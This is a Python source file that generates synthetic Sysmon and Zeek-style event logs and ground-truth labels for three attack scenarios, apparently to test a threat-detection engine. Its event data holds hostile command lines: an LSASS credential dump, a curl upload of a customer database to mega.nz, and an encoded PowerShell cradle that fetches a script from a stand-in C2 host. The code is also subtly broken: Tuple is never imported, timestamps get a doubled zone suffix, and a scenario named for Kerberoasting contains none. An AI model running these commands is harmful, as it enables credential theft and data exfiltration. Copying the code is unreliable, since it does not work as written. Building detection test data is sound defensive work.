import uuid
import json
from typing import List, Dict, Any
from datetime import datetime, timedelta, timezone
from backend.app.schemas import NormalizedEvent
from backend.app.config import GROUND_TRUTH_DIR, DEMO_DATA_DIR

# Realistic normal background events pool
BACKGROUND_USERS = ["alice.smith", "bob.martin", "carol.white", "dave.clark", "eva.davis", "system"]
BACKGROUND_HOSTS = ["WS-FIN-12", "WS-ENG-04", "WS-MKT-08", "SRV-FILE-01", "WS-SALES-15"]
BACKGROUND_PROCESSES = ["chrome.exe", "slack.exe", "outlook.exe", "excel.exe", "git.exe", "explorer.exe"]

def generate_background_event(base_time: datetime, offset_sec: int) -> NormalizedEvent:
    import random
    ts = (base_time + timedelta(seconds=offset_sec)).isoformat().replace("+00:00", "Z")
    user = random.choice(BACKGROUND_USERS)
    host = random.choice(BACKGROUND_HOSTS)
    proc = random.choice(BACKGROUND_PROCESSES)
    ev_type = random.choice(["process_creation", "authentication", "network_connection"])

    if ev_type == "authentication":
        return NormalizedEvent(
            event_id=f"bg-{uuid.uuid4().hex[:10]}",
            timestamp=ts,
            source="windows_sysmon",
            source_type="identity",
            host=host,
            user=user,
            source_ip=f"192.168.1.{random.randint(10, 200)}",
            event_type="authentication",
            action="logon_success",
            raw_reference=f"User {user} successfully authenticated on {host}"
        )
    elif ev_type == "process_creation":
        return NormalizedEvent(
            event_id=f"bg-{uuid.uuid4().hex[:10]}",
            timestamp=ts,
            source="windows_sysmon",
            source_type="endpoint",
            host=host,
            user=user,
            process_name=proc,
            parent_process="explorer.exe",
            command_line=f"C:\\Program Files\\{proc} --normal-worker",
            event_type="process_creation",
            action="process_created",
            raw_reference=f"Spawned {proc} by explorer.exe"
        )
    else:
        return NormalizedEvent(
            event_id=f"bg-{uuid.uuid4().hex[:10]}",
            timestamp=ts,
            source="zeek",
            source_type="network",
            host=host,
            user=user,
            source_ip=f"192.168.1.{random.randint(10, 200)}",
            destination_ip="142.250.190.46",  # google.com
            destination_port=443,
            event_type="network_connection",
            action="network_connected",
            raw_reference=f"Routine HTTPS egress connection from {host}"
        )

# Scenario 1: PRD INC-01 Retail Breach (Vendor credential spray -> HR-07 -> Mimikatz -> FS-02 -> Exfil)
def get_scenario_1_events(start_time: datetime) -> Tuple[List[NormalizedEvent], Dict[str, Any]]:
    events: List[NormalizedEvent] = []
    ground_truth_steps = []
    sec = 0

    # Step 1: Password Spray on vendor account 'v_jallen' from external IP 185.220.101.5
    for i in range(4):
        sec += 5
        ev = NormalizedEvent(
            event_id=f"sc1-spray-{i}",
            timestamp=(start_time + timedelta(seconds=sec)).isoformat() + "Z",
            source="windows_sysmon",
            source_type="identity",
            host="HR-07",
            user="v_jallen",
            source_ip="185.220.101.5",
            event_type="authentication",
            action="logon_failed",
            raw_reference="EventID 4625: Unknown user name or bad password"
        )
        events.append(ev)

    sec += 8
    # Step 2: Successful authentication with stolen password
    ev_login_succ = NormalizedEvent(
        event_id="sc1-succ-login",
        timestamp=(start_time + timedelta(seconds=sec)).isoformat() + "Z",
        source="windows_sysmon",
        source_type="identity",
        host="HR-07",
        user="v_jallen",
        source_ip="185.220.101.5",
        event_type="authentication",
        action="logon_success",
        raw_reference="EventID 4624: Successful logon for user v_jallen"
    )
    events.append(ev_login_succ)
    ground_truth_steps.append({
        "step": 1,
        "technique_id": "T1110.001",
        "kill_chain_stage": "Delivery",
        "host": "HR-07",
        "user": "v_jallen",
        "event_ids": ["sc1-spray-0", "sc1-spray-1", "sc1-spray-2", "sc1-spray-3", "sc1-succ-login"],
        "description": "Password guessing followed by successful logon on HR-07"
    })

    # Step 3: Discovery on HR-07
    sec += 12
    ev_recon = NormalizedEvent(
        event_id="sc1-recon-whoami",
        timestamp=(start_time + timedelta(seconds=sec)).isoformat() + "Z",
        source="windows_sysmon",
        source_type="endpoint",
        host="HR-07",
        user="v_jallen",
        process_name="whoami.exe",
        parent_process="cmd.exe",
        command_line="whoami /all",
        event_type="process_creation",
        action="process_created",
        raw_reference="EventID 1: Process Created whoami.exe with arguments /all"
    )
    events.append(ev_recon)
    ground_truth_steps.append({
        "step": 2,
        "technique_id": "T1082",
        "kill_chain_stage": "Reconnaissance",
        "host": "HR-07",
        "user": "v_jallen",
        "event_ids": ["sc1-recon-whoami"],
        "description": "System Information and privilege discovery"
    })

    # Step 4: Credential Dumping via LSASS minidump
    sec += 15
    ev_dump = NormalizedEvent(
        event_id="sc1-cred-dump",
        timestamp=(start_time + timedelta(seconds=sec)).isoformat() + "Z",
        source="windows_sysmon",
        source_type="endpoint",
        host="HR-07",
        user="v_jallen",
        process_name="procdump.exe",
        parent_process="powershell.exe",
        command_line="procdump64.exe -ma lsass.exe lsass_dump.dmp",
        event_type="process_creation",
        action="process_created",
        raw_reference="EventID 1: Memory dump of lsass.exe process initiated"
    )
    events.append(ev_dump)
    ground_truth_steps.append({
        "step": 3,
        "technique_id": "T1003",
        "kill_chain_stage": "Exploitation",
        "host": "HR-07",
        "user": "v_jallen",
        "event_ids": ["sc1-cred-dump"],
        "description": "LSASS memory credential dumping to acquire domain hashes"
    })

    # Step 5: Lateral Movement over SMB to FS-02
    sec += 20
    ev_lateral = NormalizedEvent(
        event_id="sc1-lateral-smb",
        timestamp=(start_time + timedelta(seconds=sec)).isoformat() + "Z",
        source="windows_sysmon",
        source_type="network",
        host="HR-07",
        user="v_jallen",
        source_ip="192.168.1.107",
        destination_ip="10.0.30.22",  # FS-02
        destination_port=445,
        event_type="network_connection",
        action="share_accessed",
        raw_reference="EventID 5140: A network share object was accessed on \\\\10.0.30.22\\C$"
    )
    events.append(ev_lateral)
    ground_truth_steps.append({
        "step": 4,
        "technique_id": "T1021.002",
        "kill_chain_stage": "Installation",
        "host": "FS-02",
        "user": "v_jallen",
        "event_ids": ["sc1-lateral-smb"],
        "description": "Lateral movement from HR-07 to FS-02 using administrative SMB share"
    })

    # Step 6: Data Exfiltration from FS-02 to external IP 198.51.100.44
    sec += 25
    ev_exfil = NormalizedEvent(
        event_id="sc1-exfil-web",
        timestamp=(start_time + timedelta(seconds=sec)).isoformat() + "Z",
        source="windows_sysmon",
        source_type="endpoint",
        host="FS-02",
        user="v_jallen",
        process_name="curl.exe",
        parent_process="cmd.exe",
        command_line="curl -X POST https://mega.nz/api/upload -F file=@customer_db.7z",
        event_type="file_access",
        action="archive_exfil",
        destination_ip="198.51.100.44",
        raw_reference="Exfiltration of sensitive archive customer_db.7z to mega.nz"
    )
    events.append(ev_exfil)
    ground_truth_steps.append({
        "step": 5,
        "technique_id": "T1567",
        "kill_chain_stage": "Actions on Objectives",
        "host": "FS-02",
        "user": "v_jallen",
        "event_ids": ["sc1-exfil-web"],
        "description": "Archive exfiltration of sensitive records to external cloud endpoint"
    })

    ground_truth = {
        "scenario_id": "SCENARIO-01",
        "name": "INC-01 Retail Vendor Lateral Exfiltration",
        "incident_id": "INC-01",
        "initial_compromised_host": "HR-07",
        "initial_user": "v_jallen",
        "compromised_hosts": ["HR-07", "FS-02"],
        "target_assets": ["FS-02"],
        "steps": ground_truth_steps,
        "total_attack_steps": len(ground_truth_steps),
        "total_attack_events": len(events)
    }

    return events, ground_truth

# Scenario 2: Phishing PowerShell Payload & C2 Beaconing
def get_scenario_2_events(start_time: datetime) -> Tuple[List[NormalizedEvent], Dict[str, Any]]:
    events: List[NormalizedEvent] = []
    ground_truth_steps = []
    sec = 0

    sec += 10
    ev_ps = NormalizedEvent(
        event_id="sc2-ps-bypass",
        timestamp=(start_time + timedelta(seconds=sec)).isoformat() + "Z",
        source="windows_sysmon",
        source_type="endpoint",
        host="WS-FIN-12",
        user="r_hendricks",
        process_name="powershell.exe",
        parent_process="outlook.exe",
        command_line="powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbQBhAGwAaQBjAGkAbwB1AHMALgBvAHIAZwAvAGkAbgBqAGUAYwB0AC4AcABzADEAJwApAA==",
        event_type="process_creation",
        action="process_created",
        raw_reference="EventID 1: Encoded PowerShell payload execution spawned from email client"
    )
    events.append(ev_ps)
    ground_truth_steps.append({
        "step": 1,
        "technique_id": "T1059.001",
        "kill_chain_stage": "Exploitation",
        "host": "WS-FIN-12",
        "user": "r_hendricks",
        "event_ids": ["sc2-ps-bypass"],
        "description": "Suspicious encoded PowerShell download cradle executed"
    })

    sec += 15
    ev_c2 = NormalizedEvent(
        event_id="sc2-c2-beacon",
        timestamp=(start_time + timedelta(seconds=sec)).isoformat() + "Z",
        source="zeek",
        source_type="network",
        host="WS-FIN-12",
        user="r_hendricks",
        source_ip="192.168.1.112",
        destination_ip="203.0.113.88",
        destination_port=4444,
        event_type="network_connection",
        action="beacon",
        raw_reference="Zeek conn.log: Regular 15s outbound beacon to known C2 IP 203.0.113.88:4444"
    )
    events.append(ev_c2)
    ground_truth_steps.append({
        "step": 2,
        "technique_id": "T1071.001",
        "kill_chain_stage": "Command and Control",
        "host": "WS-FIN-12",
        "user": "r_hendricks",
        "event_ids": ["sc2-c2-beacon"],
        "description": "Outbound Command and Control beaconing established on port 4444"
    })

    ground_truth = {
        "scenario_id": "SCENARIO-02",
        "name": "Phishing Ingress & C2 Beaconing",
        "incident_id": "INC-02",
        "initial_compromised_host": "WS-FIN-12",
        "initial_user": "r_hendricks",
        "compromised_hosts": ["WS-FIN-12"],
        "target_assets": [],
        "steps": ground_truth_steps,
        "total_attack_steps": len(ground_truth_steps),
        "total_attack_events": len(events)
    }

    return events, ground_truth

# Scenario 3: Domain Controller Kerberoasting & Privilege Escalation Attempt
def get_scenario_3_events(start_time: datetime) -> Tuple[List[NormalizedEvent], Dict[str, Any]]:
    events: List[NormalizedEvent] = []
    ground_truth_steps = []
    sec = 0

    sec += 10
    ev_nltest = NormalizedEvent(
        event_id="sc3-nltest-dc",
        timestamp=(start_time + timedelta(seconds=sec)).isoformat() + "Z",
        source="windows_sysmon",
        source_type="endpoint",
        host="WS-ENG-04",
        user="svc_backup",
        process_name="nltest.exe",
        parent_process="cmd.exe",
        command_line="nltest.exe /dclist:CORP",
        event_type="process_creation",
        action="process_created",
        raw_reference="Active Directory domain controller enumeration via nltest"
    )
    events.append(ev_nltest)
    ground_truth_steps.append({
        "step": 1,
        "technique_id": "T1082",
        "kill_chain_stage": "Reconnaissance",
        "host": "WS-ENG-04",
        "user": "svc_backup",
        "event_ids": ["sc3-nltest-dc"],
        "description": "Domain controller discovery"
    })

    sec += 15
    ev_auth_dc = NormalizedEvent(
        event_id="sc3-smb-dc",
        timestamp=(start_time + timedelta(seconds=sec)).isoformat() + "Z",
        source="windows_sysmon",
        source_type="network",
        host="WS-ENG-04",
        user="svc_backup",
        source_ip="192.168.1.104",
        destination_ip="10.0.10.10",  # DC-01
        destination_port=445,
        event_type="network_connection",
        action="remote_ipc",
        raw_reference="Attempted remote IPC session from WS-ENG-04 to Primary Domain Controller DC-01"
    )
    events.append(ev_auth_dc)
    ground_truth_steps.append({
        "step": 2,
        "technique_id": "T1021.002",
        "kill_chain_stage": "Installation",
        "host": "DC-01",
        "user": "svc_backup",
        "event_ids": ["sc3-smb-dc"],
        "description": "Lateral administrative connection attempt to Primary Domain Controller"
    })

    ground_truth = {
        "scenario_id": "SCENARIO-03",
        "name": "Active Directory DC Kerberoast & Pivot",
        "incident_id": "INC-03",
        "initial_compromised_host": "WS-ENG-04",
        "initial_user": "svc_backup",
        "compromised_hosts": ["WS-ENG-04"],
        "target_assets": ["DC-01"],
        "steps": ground_truth_steps,
        "total_attack_steps": len(ground_truth_steps),
        "total_attack_events": len(events)
    }

    return events, ground_truth

def save_scenario_demo_files():
    """
    Exports structured demo log datasets and ground-truth files into demo_data/ and ground_truth/
    """
    now = datetime.now(timezone.utc)
    scenarios = [
        ("scenario_1", get_scenario_1_events),
        ("scenario_2", get_scenario_2_events),
        ("scenario_3", get_scenario_3_events)
    ]
    for s_name, s_fn in scenarios:
        events, gt = s_fn(now)
        # Mix in 20 background events interleaved
        full_events = list(events)
        for i in range(25):
            full_events.append(generate_background_event(now, i * 4))
        full_events.sort(key=lambda x: x.timestamp)

        # Save JSON demo dataset
        demo_path = DEMO_DATA_DIR / f"{s_name}.json"
        with open(demo_path, "w", encoding="utf-8") as f:
            json.dump([e.model_dump() for e in full_events], f, indent=2)

        # Save JSONL demo dataset
        demo_jsonl_path = DEMO_DATA_DIR / f"{s_name}.jsonl"
        with open(demo_jsonl_path, "w", encoding="utf-8") as f:
            for e in full_events:
                f.write(json.dumps(e.model_dump()) + "\n")

        # Save Ground Truth separately (ISOLATED from detection engine!)
        gt_path = GROUND_TRUTH_DIR / f"{s_name}_ground_truth.json"
        with open(gt_path, "w", encoding="utf-8") as f:
            json.dump(gt, f, indent=2)
